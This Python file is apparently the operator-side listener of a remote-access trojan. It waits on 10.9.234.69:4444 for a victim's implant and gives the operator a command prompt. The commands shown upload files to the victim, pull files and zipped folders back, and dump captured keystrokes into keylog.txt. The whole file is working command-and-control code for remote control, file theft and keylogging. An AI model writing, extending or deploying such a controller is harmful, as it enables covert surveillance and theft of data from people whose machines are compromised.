import socket
import json
import base64
import zipfile
import os

class Listener:

    def __init__(self, ip, port):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.conn.bind((ip, port))
        self.conn.listen(0)
        print(f"[+] Listener started on {ip}:{port}")

        self.connection, address = self.conn.accept()
        print(f"[+] Connection received from {address}")

    def send(self, data):
        json_data = json.dumps(data)
        try:
            self.connection.send(json_data.encode())
        except BrokenPipeError:
            print("[-] Broken connection...Exiting now!")
            self.cleanup()
            exit(0)

    def receive(self):
        json_result = ""
        while True:
            try:
                json_result += self.connection.recv(1024).decode()
                return json.loads(json_result)
            except ValueError:
                continue

    def download_file(self, data, path):
        try:
            if data.startswith("FOLDER:"):
                folder_name, content = data[7:].split(":", 1)
                zip_path = f"{folder_name}.zip"
                with open(zip_path, "wb") as file:
                    file.write(base64.b64decode(content))
                with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                    zip_ref.extractall(folder_name)
                os.remove(zip_path)
                return f"[+] Folder '{folder_name}' downloaded and extracted successfully!"
            else:
                with open(path, "wb") as file:
                    file.write(base64.b64decode(data))
                return "[+] File downloaded successfully!"
        except Exception as e:
            return f"[-] Error during file/folder download: {str(e)}"

    def upload_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode()
        except FileNotFoundError:
            return "[-] File not found"
        except Exception as e:
            return f"[-] Exception: {e}"

    def cleanup(self):
        print("[+] Closing connection...")
        self.connection.close()
        self.conn.close()

    def run(self):
        while True:
            data = input(">> ")
            command = data.split(" ", 1)

            if command[0] == "exit":
                self.send("exit")
                self.cleanup()
                return

            if command[0] == "upload":
                file_content = self.upload_file(command[1])
                data = f"upload {command[1]} {file_content}"

            self.send(data)
            result = self.receive()

            if command[0] == "get" or command[0] == "keyscan_dump":
                if result.startswith("[-]"): 
                    print(result) 
                else:
                    try:
                        file_name = "keylog.txt" if command[0] == "keyscan_dump" else command[1]
                        download_result = self.download_file(result, file_name)
                        print(download_result) 
                    except Exception as e:
                        print(f"[-] Error during file/folder download: {str(e)}")
            
            else:
                print(result)

listener = Listener("10.9.234.69", 4444)

try:
    listener.run()
except KeyboardInterrupt:
    print("\n[+] Program interrupted by user.")
    listener.cleanup()
    exit(0)
